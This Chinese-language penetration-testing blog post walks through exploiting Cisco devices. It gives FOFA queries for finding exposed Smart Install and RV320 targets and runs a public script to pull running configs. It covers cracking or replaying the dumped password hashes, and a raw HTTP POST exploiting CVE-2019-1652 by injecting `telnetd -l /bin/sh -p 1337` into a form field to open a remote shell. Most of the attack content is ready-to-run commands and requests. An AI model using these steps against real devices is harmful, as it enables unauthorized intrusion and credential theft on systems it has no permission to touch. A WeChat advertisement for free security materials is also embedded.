## 前言

在日常的渗透任务中，除了常见的集权设备，高危组件的漏洞挖掘，一些iot设备目标也是可以作为重点关注的存在。近期实战中遇到了几个cisco配置信息泄漏的案例，借此机会复习总结下cisco常见的漏洞。

* * *

## cisco SMI 配置泄漏

Cisco SMI 是一种即插即用功能，可为 Cisco 交换机提供零接触部署并在 TCP 端口 4786
上进行通信。如果发现开放4786端口的cisco设备，那可以深入测试一下。

fofa 语句 protocol="smi"

![Untitled](https://image.3001.net/images/20221020/1666254916_6351084492f3a58b60b59.png!small)

影响目标还挺多的

    
    
    git clone https://github.com/ChristianPapathanasiou/CiscoSmartInstallExploit  
    cd CiscoSmartInstallExploit  
    pip2 install tftpy  
    python2 cisco.py [ip]

注意用python2运行,运行成功会下载目标的运行配置

![Untitled](https://image.3001.net/images/20221020/1666254917_63510845abe4eeaef7d3c.png!small)

配置文件中存有设备用户密码，ACL配置，ftp配置账号密码等敏感信息

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

如果想进一步分析配置文件可以下载 ccat 工具进行自动化分析

<https://github.com/frostbits-security/ccat>

    
    
    git clone https://github.com/frostbits-security/ccat.git  
    cd ccat  
    pip3 install -r requirements.txt  
    python3 ccat.py configuration_file

![Untitled](https://image.3001.net/images/20221020/1666254919_63510847165e48d781c24.png!small)

我们可以使用 **\--dump-creds** 参数dump出账号密码

![Untitled](https://image.3001.net/images/20221020/1666254920_635108485f4d0ddf55005.png!small)

文件名m500的可以用hashcat -m 500的掩码进行爆破,5700同理

![Untitled](https://image.3001.net/images/20221020/1666254921_63510849966ab086104e6.png!small)

* * *

## CVE-2019-1652 && CVE-2019-1653

Cisco RV320 路由器的配置可以在未经身份验证的情况下通过设备的 Web 界面导出。

fofa 语句 app="CISCO-RV320”

对应poc

    
    
    ip:port/cgi-bin/config.exp

![Untitled](https://image.3001.net/images/20221020/1666254923_6351084b21bb8e9e52ee1.png!small)

下载的配置文件中有账号和md5的密码,不过md5的格式为 `md5($password.$auth_key)`，其中 auth_key
是一个静态值，可以通过直接访问 / 路径找到。

![Untitled](https://image.3001.net/images/20221020/1666254924_6351084c3d9bebd6b9f1e.png!small)

当然在通过 CVE-2019-1653 获得了账号和md5的密码后可以通过替换登录包的hash进行登录,无需解密

![Untitled](https://image.3001.net/images/20221020/1666254925_6351084d43efa6b5209be.png!small)

![Untitled](https://image.3001.net/images/20221020/1666254926_6351084e96b3432dc5107.png!small)

后台可以配合 CVE-2019-1652 进行 rce

github上的利用poc由于不支持目标的自签名证书
<https://github.com/0x27/CiscoRV320Dump/blob/master/easy_access.py>这里就手动发包进行测试

    
    
    POST /certificate_handle2.htm?type=4 HTTP/1.1  
    Host: x.x.x.x  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: mlap=RGVmYXVsdDk6Ojo6Y2lzY28=  
    Connection: close  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 319  
    ​  
    page=self_generator.htm&totalRules=1&OpenＶＰＮRules=30&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A&organization=A&organization_unit=A&email=ab%40example.com&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&SelectSubject_s=1&common_name=a%27%24%28telnetd%20-l%20%2Fbin%2Fsh%20-p%201337%29%27b

payload执行后会用telnet在本地监听1337口

连接验证

![Untitled](https://image.3001.net/images/20221020/1666254927_6351084fc1dbfee8982be.png!small)

* * *

## 总结

  1. cisco设备国内互联网公司和企事业用的不多，今年来都被国产品牌替换了。

  2. python的poc经常会遇到一些历史遗留问题，比如tls版本过低，依赖库安装报错不兼容等等问题，建议还是用go写poc，利人利己。

 **  
更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

